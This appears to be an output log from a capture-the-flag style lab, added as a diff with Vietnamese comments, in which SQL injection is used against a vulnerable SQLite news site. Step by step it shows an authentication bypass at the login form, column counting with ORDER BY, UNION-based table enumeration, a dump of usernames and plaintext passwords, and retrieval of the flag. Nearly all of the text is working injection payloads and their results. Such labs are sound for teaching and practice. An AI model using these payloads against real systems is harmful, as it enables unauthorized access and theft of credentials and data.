@@ -1,0 +1,43 @@
+############################################################
+# 0. Request binh thuong (de doi chieu)
+############################################################
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%Chao%'</code></p><ul><li>[1] Chao mung : Bai viet gioi thieu he thong tin tuc Acme.</li></ul><a href='/'>ve trang chu</a>
+
+############################################################
+# 1. AUTH BYPASS o /login (khong can biet mat khau)
+#    username = admin'-- -   -> comment bo phan kiem password
+############################################################
+-- Thu dang nhap thuong (sai pass) :
+HTTP 401
+-- Auth bypass :
+Dang nhap thanh cong. id=1 username=admin role=admin
+[HTTP 200]
+-- Hoac kieu ' OR 1=1 (lay row dau tien) :
+Dang nhap thanh cong. id=1 username=admin role=admin
+[HTTP 200]
+
+############################################################
+# 2. ERROR-BASED: xac dinh so cot bang ORDER BY (sqlite bao thang)
+############################################################
+-- ORDER BY 4 (vuot) :
+Loi truy van: 1st ORDER BY term out of range - should be between 1 and 3
+-- ORDER BY 3 (OK, khong loi) :
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%' ORDER BY 3-- -%'</code></p><ul><li>[1] Chao mung ...
+
+############################################################
+# 3. UNION NULL: xac nhan 3 cot khong loi kieu
+############################################################
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%' UNION SELECT NULL,NULL,NULL-- -%'</code></p><ul><li>[None] None : None</li><li>[1] Chao mung : Bai viet gioi thieu he thong tin  ...
+
+############################################################
+# 4. UNION: liet ke bang qua sqlite_master
+############################################################
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%' UNION SELECT 1,name,type FROM sqlite_master WHERE type='table'-- -%'</code></p><ul><li>[1] Chao mung : Bai viet gioi thieu he thong tin tuc Acme.</li><li>[1] articles : table</li><li>[1] secret_flag : table</li><li>[1] users : table</li><li>[2] Huong dan : Cach dang ky tai khoan va dang bai.</li><li>[3] Thong bao bao tri : He thong bao tri luc 2h sang chu nhat.</li></ul><a href='/'>ve trang chu</a>
+############################################################
+# 5. UNION: dump username + password bang users
+############################################################
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%' UNION SELECT id,username,password FROM users-- -%'</code></p><ul><li>[1] Chao mung : Bai viet gioi thieu he thong tin tuc Acme.</li><li>[1] admin : S3cr3t_Admin_Pw_2024!</li><li>[2] Huong dan : Cach dang ky tai khoan va dang bai.</li><li>[2] alice : alice_password_123</li><li>[3] Thong bao bao tri : He thong bao tri luc 2h sang chu nhat.</li><li>[3] bob : hunter2</li></ul><a href='/'>ve trang chu</a>
+############################################################
+# 6. UNION: dump bang secret_flag -> LAY FLAG
+############################################################
+<p>SQL: <code>SELECT id, title, body FROM articles WHERE title LIKE '%' UNION SELECT id,name,value FROM secret_flag-- -%'</code></p><ul><li>[1] Chao mung : Bai viet gioi thieu he thong tin tuc Acme.</li><li>[1] flag : WEB{un10n_select_dump_toan_bo_db}</li><li>[2] Huong dan : Cach dang ky tai khoan va dang bai.</li><li>[3] Thong bao bao tri : He thong bao tri luc 2h sang chu nhat.</li></ul><a href='/'>ve trang chu</a>
